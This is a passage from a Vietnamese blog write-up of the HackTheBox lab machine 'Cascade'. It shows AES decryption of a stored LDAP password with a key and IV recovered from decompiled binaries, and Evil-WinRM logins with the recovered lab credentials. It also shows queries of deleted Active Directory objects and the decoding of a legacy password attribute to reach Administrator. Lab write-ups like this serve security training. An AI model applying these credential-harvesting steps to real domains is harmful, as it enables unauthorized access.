</span></span></code></pre></td></tr></table></div></div><p>Chúng ta lấy được 1 đoạn encrypt bằng base64. Tuy nhiên sau khi giải mã thì dường như đoạn mã hoá này phải thêm 1 bước giải mã nữa. Thực hiện decompile <code>CaseAudit.exe</code> và <code>CaseCrypto.dll</code> bằng dotPeek để xem chương trình thực hiện mã hoá và giải mã như nào.</p><p>File CaseCrypto.dll</p><p><img loading=lazy src=https://images.viblo.asia/5abe1466-94a9-487c-b474-71dfec2c5a8e.png></p><p>Thực hiện giải mã với AES 128 bit, sử dụng mode CBC, khoá <code>IV = 1tdyjCbY1Ix49842</code></p><p>Tiếp tục biên dịch file CaseAudit.exe</p><p><img loading=lazy src=https://images.viblo.asia/db160e36-b05b-4683-816e-6f96ec9706bf.png></p><p>Đoạn code sẽ truy vấn vào bảng LDAP trong CSDL rồi thực hiện encrypt với <code>key=c4scadek3y654321</code>. Sử dụng key và IV để giải mã.</p><p><img loading=lazy src=https://images.viblo.asia/06d389c3-cb87-4425-a3a1-efb05d38be21.png></p><p>Ở đây mình sử dụng CyberChef để giải mã <a href="https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)AES_Decrypt(%7B'option':'UTF8','string':'c4scadek3y654321'%7D,%7B'option':'UTF8','string':'1tdyjCbY1Ix49842'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D)&amp;input=QlFPNWw1S2o5TWRFclh4NlE2QUdPdyA9PQ">Decrypt</a></p><p>Vậy ta thu được mật khẩu của user <code>ArkSvc:w3lc0meFr31nd</code></p><p>Thực hiện đăng nhập với Evil-WinRM và chúng ta có</p><p><img loading=lazy src=https://images.viblo.asia/31b5d14f-5390-4c64-9cc8-6361a4916876.png></p><p><img loading=lazy src=https://images.viblo.asia/52dad3ec-3168-425c-8f71-4e20e53de850.png></p><p>Kiểm tra 1 chủ thấy người dùng Arksvc thuộc Group AD Recycle Bin</p><p>Sử dụng winPEAS.exe cũng không thu được kết quả gì, do mình thuộc Group AD Recycle Bin, nên mình có thể tìm kiếm được đã có những Account nào đã bị xoá.</p><p><a href="https://social.technet.microsoft.com/Forums/en-US/5424e204-d601-4330-a7ed-331134e47e18/filter-deleted-users-in-getadobject-cmdlet-also-returns-deleted-computers?forum=ITCG">https://social.technet.microsoft.com/Forums/en-US/5424e204-d601-4330-a7ed-331134e47e18/filter-deleted-users-in-getadobject-cmdlet-also-returns-deleted-computers?forum=ITCG</a></p><p>Sau khi googling thì tìm được đoạn code như sau</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=p>*</span><span class=nb>Evil-WinRM</span><span class=p>*</span> <span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>arksvc</span><span class=p>\</span><span class=n>Documents</span><span class=p>&gt;</span> <span class=nb>get-adobject</span> <span class=n>-Filter</span> <span class=p>{</span><span class=n>Deleted</span> <span class=o>-eq</span> <span class=vm>$true</span> <span class=o>-and</span> <span class=n>ObjectClass</span> <span class=o>-eq</span> <span class=s2>&#34;user&#34;</span><span class=p>}</span> <span class=n>-IncludeDeletedObjects</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Deleted</span>           <span class=err>:</span> <span class=n>True</span>
</span></span><span class=line><span class=cl><span class=n>DistinguishedName</span> <span class=err>:</span> <span class=n>CN</span><span class=p>=</span><span class=nb>CASC-WS1</span><span class=p>\</span><span class=n>0ADEL</span><span class=err>:</span><span class=n>6d97daa4</span><span class=p>-</span><span class=mf>2e82</span><span class=p>-</span><span class=mf>4946</span><span class=n>-a11e-f91fa18bfabe</span><span class=p>,</span><span class=n>CN</span><span class=p>=</span><span class=n>Deleted</span> <span class=n>Objects</span><span class=p>,</span><span class=n>DC</span><span class=p>=</span><span class=n>cascade</span><span class=p>,</span><span class=n>DC</span><span class=p>=</span><span class=n>local</span>
</span></span><span class=line><span class=cl><span class=n>Name</span>              <span class=err>:</span> <span class=nb>CASC-WS1</span>
</span></span><span class=line><span class=cl>                    <span class=n>DEL</span><span class=err>:</span><span class=n>6d97daa4</span><span class=p>-</span><span class=mf>2e82</span><span class=p>-</span><span class=mf>4946</span><span class=n>-a11e-f91fa18bfabe</span>
</span></span><span class=line><span class=cl><span class=n>ObjectClass</span>       <span class=err>:</span> <span class=n>computer</span>
</span></span><span class=line><span class=cl><span class=n>ObjectGUID</span>        <span class=err>:</span> <span class=n>6d97daa4</span><span class=p>-</span><span class=mf>2e82</span><span class=p>-</span><span class=mf>4946</span><span class=n>-a11e-f91fa18bfabe</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Deleted</span>           <span class=err>:</span> <span class=n>True</span>
</span></span><span class=line><span class=cl><span class=n>DistinguishedName</span> <span class=err>:</span> <span class=n>CN</span><span class=p>=</span><span class=n>TempAdmin</span><span class=p>\</span><span class=n>0ADEL</span><span class=err>:</span><span class=n>f0cc344d</span><span class=p>-</span><span class=mf>31e0</span><span class=p>-</span><span class=mf>4866</span><span class=n>-bceb-a842791ca059</span><span class=p>,</span><span class=n>CN</span><span class=p>=</span><span class=n>Deleted</span> <span class=n>Objects</span><span class=p>,</span><span class=n>DC</span><span class=p>=</span><span class=n>cascade</span><span class=p>,</span><span class=n>DC</span><span class=p>=</span><span class=n>local</span>
</span></span><span class=line><span class=cl><span class=n>Name</span>              <span class=err>:</span> <span class=n>TempAdmin</span>
</span></span><span class=line><span class=cl>                    <span class=n>DEL</span><span class=err>:</span><span class=n>f0cc344d</span><span class=p>-</span><span class=mf>31e0</span><span class=p>-</span><span class=mf>4866</span><span class=n>-bceb-a842791ca059</span>
</span></span><span class=line><span class=cl><span class=n>ObjectClass</span>       <span class=err>:</span> <span class=n>user</span>
</span></span><span class=line><span class=cl><span class=n>ObjectGUID</span>        <span class=err>:</span> <span class=n>f0cc344d</span><span class=p>-</span><span class=mf>31e0</span><span class=p>-</span><span class=mf>4866</span><span class=n>-bceb-a842791ca059</span>
</span></span></code></pre></td></tr></table></div></div><p>Vậy là chúng ta có user TempAdmin đã bị xoá, vậy có thể khôi phục lại tài khoản này và lên được admin hay không.</p><p><img loading=lazy src=https://images.viblo.asia/7fae18bc-80a8-464f-b5e9-913635718896.png></p><p>Nhưng user này lại k có quyền khôi phục lại account TempAdmin.</p><p>Tuy nhiên chúng ta có thể xem được Properties của account</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=p>*</span><span class=nb>Evil-WinRM</span><span class=p>*</span> <span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>arksvc</span><span class=p>\</span><span class=n>Documents</span><span class=p>&gt;</span> <span class=nb>get-adobject</span> <span class=n>-Filter</span> <span class=p>{</span><span class=n>Deleted</span> <span class=o>-eq</span> <span class=vm>$true</span> <span class=o>-and</span> <span class=n>ObjectClass</span> <span class=o>-eq</span> <span class=s2>&#34;user&#34;</span><span class=p>}</span> <span class=n>-IncludeDeletedObjects</span> <span class=n>-Properties</span> <span class=p>*</span>
</span></span><span class=line><span class=cl><span class=n>accountExpires</span>                  <span class=err>:</span> <span class=mf>9223372036854775807</span>
</span></span><span class=line><span class=cl><span class=n>badPasswordTime</span>                 <span class=err>:</span> <span class=mf>0</span>
</span></span><span class=line><span class=cl><span class=n>badPwdCount</span>                     <span class=err>:</span> <span class=mf>0</span>
</span></span><span class=line><span class=cl><span class=n>CanonicalName</span>                   <span class=err>:</span> <span class=n>cascade</span><span class=p>.</span><span class=n>local</span><span class=p>/</span><span class=n>Deleted</span> <span class=n>Objects</span><span class=p>/</span><span class=n>TempAdmin</span>
</span></span><span class=line><span class=cl>                                  <span class=n>DEL</span><span class=err>:</span><span class=n>f0cc344d</span><span class=p>-</span><span class=mf>31e0</span><span class=p>-</span><span class=mf>4866</span><span class=n>-bceb-a842791ca059</span>
</span></span><span class=line><span class=cl><span class=n>cascadeLegacyPwd</span>                <span class=err>:</span> <span class=n>YmFDVDNyMWFOMDBkbGVz</span>
</span></span><span class=line><span class=cl><span class=n>CN</span>                              <span class=err>:</span> <span class=n>TempAdmin</span>
</span></span><span class=line><span class=cl>                                  <span class=n>DEL</span><span class=err>:</span><span class=n>f0cc344d</span><span class=p>-</span><span class=mf>31e0</span><span class=p>-</span><span class=mf>4866</span><span class=n>-bceb-a842791ca059</span>
</span></span><span class=line><span class=cl><span class=n>codePage</span>                        <span class=err>:</span> <span class=mf>0</span>
</span></span><span class=line><span class=cl><span class=n>countryCode</span>                     <span class=err>:</span> <span class=mf>0</span>
</span></span><span class=line><span class=cl><span class=n>Created</span>                         <span class=err>:</span> <span class=mf>1</span><span class=p>/</span><span class=mf>27</span><span class=p>/</span><span class=mf>2020</span> <span class=mf>3</span><span class=err>:</span><span class=mf>23</span><span class=err>:</span><span class=mf>08</span> <span class=n>AM</span>
</span></span><span class=line><span class=cl><span class=n>createTimeStamp</span>                 <span class=err>:</span> <span class=mf>1</span><span class=p>/</span><span class=mf>27</span><span class=p>/</span><span class=mf>2020</span> <span class=mf>3</span><span class=err>:</span><span class=mf>23</span><span class=err>:</span><span class=mf>08</span> <span class=n>AM</span>
</span></span><span class=line><span class=cl><span class=n>Deleted</span>                         <span class=err>:</span> <span class=n>True</span>
</span></span><span class=line><span class=cl><span class=n>Description</span>                     <span class=err>:</span>
</span></span><span class=line><span class=cl><span class=n>DisplayName</span>                     <span class=err>:</span> <span class=n>TempAdmin</span>
</span></span><span class=line><span class=cl><span class=n>DistinguishedName</span>               <span class=err>:</span> <span class=n>CN</span><span class=p>=</span><span class=n>TempAdmin</span><span class=p>\</span><span class=n>0ADEL</span><span class=err>:</span><span class=n>f0cc344d</span><span class=p>-</span><span class=mf>31e0</span><span class=p>-</span><span class=mf>4866</span><span class=n>-bceb-a842791ca059</span><span class=p>,</span><span class=n>CN</span><span class=p>=</span><span class=n>Deleted</span> <span class=n>Objects</span><span class=p>,</span><span class=n>DC</span><span class=p>=</span><span class=n>cascade</span><span class=p>,</span><span class=n>DC</span><span class=p>=</span><span class=n>local</span>
</span></span><span class=line><span class=cl><span class=n>dSCorePropagationData</span>           <span class=err>:</span> <span class=p>{</span><span class=mf>1</span><span class=p>/</span><span class=mf>27</span><span class=p>/</span><span class=mf>2020</span> <span class=mf>3</span><span class=err>:</span><span class=mf>23</span><span class=err>:</span><span class=mf>08</span> <span class=n>AM</span><span class=p>,</span> <span class=mf>1</span><span class=p>/</span><span class=mf>1</span><span class=p>/</span><span class=mf>1601</span> <span class=mf>12</span><span class=err>:</span><span class=mf>00</span><span class=err>:</span><span class=mf>00</span> <span class=n>AM</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>givenName</span>                       <span class=err>:</span> <span class=n>TempAdmin</span>
</span></span><span class=line><span class=cl><span class=n>instanceType</span>                    <span class=err>:</span> <span class=mf>4</span>
</span></span><span class=line><span class=cl><span class=n>isDeleted</span>                       <span class=err>:</span> <span class=n>True</span>
</span></span><span class=line><span class=cl><span class=n>LastKnownParent</span>                 <span class=err>:</span> <span class=n>OU</span><span class=p>=</span><span class=n>Users</span><span class=p>,</span><span class=n>OU</span><span class=p>=</span><span class=n>UK</span><span class=p>,</span><span class=n>DC</span><span class=p>=</span><span class=n>cascade</span><span class=p>,</span><span class=n>DC</span><span class=p>=</span><span class=n>local</span>
</span></span><span class=line><span class=cl><span class=n>lastLogoff</span>                      <span class=err>:</span> <span class=mf>0</span>
</span></span><span class=line><span class=cl><span class=n>lastLogon</span>                       <span class=err>:</span> <span class=mf>0</span>
</span></span><span class=line><span class=cl><span class=n>logonCount</span>                      <span class=err>:</span> <span class=mf>0</span>
</span></span><span class=line><span class=cl><span class=n>Modified</span>                        <span class=err>:</span> <span class=mf>1</span><span class=p>/</span><span class=mf>27</span><span class=p>/</span><span class=mf>2020</span> <span class=mf>3</span><span class=err>:</span><span class=mf>24</span><span class=err>:</span><span class=mf>34</span> <span class=n>AM</span>
</span></span><span class=line><span class=cl><span class=n>modifyTimeStamp</span>                 <span class=err>:</span> <span class=mf>1</span><span class=p>/</span><span class=mf>27</span><span class=p>/</span><span class=mf>2020</span> <span class=mf>3</span><span class=err>:</span><span class=mf>24</span><span class=err>:</span><span class=mf>34</span> <span class=n>AM</span>
</span></span><span class=line><span class=cl><span class=nb>msDS-LastKnownRDN</span>               <span class=err>:</span> <span class=n>TempAdmin</span>
</span></span><span class=line><span class=cl><span class=n>Name</span>                            <span class=err>:</span> <span class=n>TempAdmin</span>
</span></span><span class=line><span class=cl>                                  <span class=n>DEL</span><span class=err>:</span><span class=n>f0cc344d</span><span class=p>-</span><span class=mf>31e0</span><span class=p>-</span><span class=mf>4866</span><span class=n>-bceb-a842791ca059</span>
</span></span></code></pre></td></tr></table></div></div><p>Lại 1 lần nữa thấy sự xuất hiện của <code>cascadeLegacyPwd</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>➜  Cascade <span class=nb>echo</span> -n YmFDVDNyMWFOMDBkbGVz <span class=p>|</span> base64 -d
</span></span><span class=line><span class=cl>baCT3r1aN00dles
</span></span></code></pre></td></tr></table></div></div><p>Thử đăng nhập với tài khoản Administrator với mật khẩu trên</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=err>➜</span>  <span class=n>Cascade</span> <span class=nb>evil-winrm</span> <span class=n>-u</span> <span class=n>Administrator</span> <span class=n>-p</span> <span class=n>baCT3r1aN00dles</span> <span class=n>-i</span> <span class=mf>10.10</span><span class=p>.</span><span class=py>10</span><span class=p>.</span><span class=py>182</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>Evil-WinRM</span> <span class=n>shell</span> <span class=n>v2</span><span class=p>.</span><span class=py>3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Info</span><span class=err>:</span> <span class=n>Establishing</span> <span class=n>connection</span> <span class=n>to</span> <span class=n>remote</span> <span class=n>endpoint</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>*</span><span class=nb>Evil-WinRM</span><span class=p>*</span> <span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>Administrator</span><span class=p>\</span><span class=n>Documents</span><span class=p>&gt;</span> <span class=nb>cd </span><span class=p>..</span>
</span></span><span class=line><span class=cl><span class=p>*</span><span class=nb>Evil-WinRM</span><span class=p>*</span> <span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>Administrator</span><span class=p>&gt;</span> <span class=nb>cd </span><span class=n>Desktop</span>
</span></span><span class=line><span class=cl><span class=p>*</span><span class=nb>Evil-WinRM</span><span class=p>*</span> <span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>Administrator</span><span class=p>\</span><span class=n>Desktop</span><span class=p>&gt;</span> <span class=nb>cat </span><span class=n>root</span><span class=p>.</span><span class=py>txt</span>
</span></span><span class=line><span class=cl><span class=n>0ec81c0ccc6c0b0923b9db5e97dde189</span>
</span></span></code></pre></td></tr></table></div></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://minhtuanact.github.io/tags/hackthebox/>HackTheBox</a></li><li><a href=https://minhtuanact.github.io/tags/writeup/>WriteUp</a></li><li><a href=https://minhtuanact.github.io/tags/cascade/>Cascade</a></li></ul><nav class=paginav><a class=prev href=https://minhtuanact.github.io/posts/leo-thang-dac-quyen-trong-windows-windows-privilege-escalation-2-stored-credentials-kernel-exploits-scheduled-tasks/><span class=title>« Prev</span><br><span>Leo thang đặc quyền trong Windows - Windows Privilege Escalation #2: Stored Credentials, Kernel Exploits, Scheduled Tasks, ...</span>
</a><a class=next href=https://minhtuanact.github.io/posts/hackthebox-writeup-book/><span class=title>Next »</span><br><span>[Hackthebox- Writeup] Book</span></a></nav><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share [Hackthebox - Writeup] Cascade on x" href="https://x.com/intent/tweet/?text=%5bHackthebox%20-%20Writeup%5d%20Cascade&amp;url=https%3a%2f%2fminhtuanact.github.io%2fposts%2fhackthebox-writeup-cascade%2f&amp;hashtags=HackTheBox%2cWriteUp%2ccascade"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share [Hackthebox - Writeup] Cascade on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fminhtuanact.github.io%2fposts%2fhackthebox-writeup-cascade%2f&amp;title=%5bHackthebox%20-%20Writeup%5d%20Cascade&amp;summary=%5bHackthebox%20-%20Writeup%5d%20Cascade&amp;source=https%3a%2f%2fminhtuanact.github.io%2fposts%2fhackthebox-writeup-cascade%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share [Hackthebox - Writeup] Cascade on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fminhtuanact.github.io%2fposts%2fhackthebox-writeup-cascade%2f&title=%5bHackthebox%20-%20Writeup%5d%20Cascade"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share [Hackthebox - Writeup] Cascade on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fminhtuanact.github.io%2fposts%2fhackthebox-writeup-cascade%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share [Hackthebox - Writeup] Cascade on whatsapp" href="https://api.whatsapp.com/send?text=%5bHackthebox%20-%20Writeup%5d%20Cascade%20-%20https%3a%2f%2fminhtuanact.github.io%2fposts%2fhackthebox-writeup-cascade%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share [Hackthebox - Writeup] Cascade on telegram" href="https://telegram.me/share/url?text=%5bHackthebox%20-%20Writeup%5d%20Cascade&amp;url=https%3a%2f%2fminhtuanact.github.io%2fposts%2fhackthebox-writeup-cascade%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share [Hackthebox - Writeup] Cascade on ycombinator" href="https://news.ycombinator.com/submitlink?t=%5bHackthebox%20-%20Writeup%5d%20Cascade&u=https%3a%2f%2fminhtuanact.github.io%2fposts%2fhackthebox-writeup-cascade%2f"><svg width="30" height="30" viewBox="0 0 512 512" fill="currentcolor" xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"><path d="M449.446.0C483.971.0 512 28.03 512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446zM183.8767 87.9921h-62.034L230.6673 292.4508V424.0079h50.6655V292.4508L390.1575 87.9921H328.1233L256 238.2489z"/></svg></a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://minhtuanact.github.io/>minhtuanact|Blog - Keep a flame in the rain!</a></span> ·
Like a locksmith studying the art of keys, I share knowledge to illuminate, not to break. ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script src=/js/hacker-effects.js></script><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const 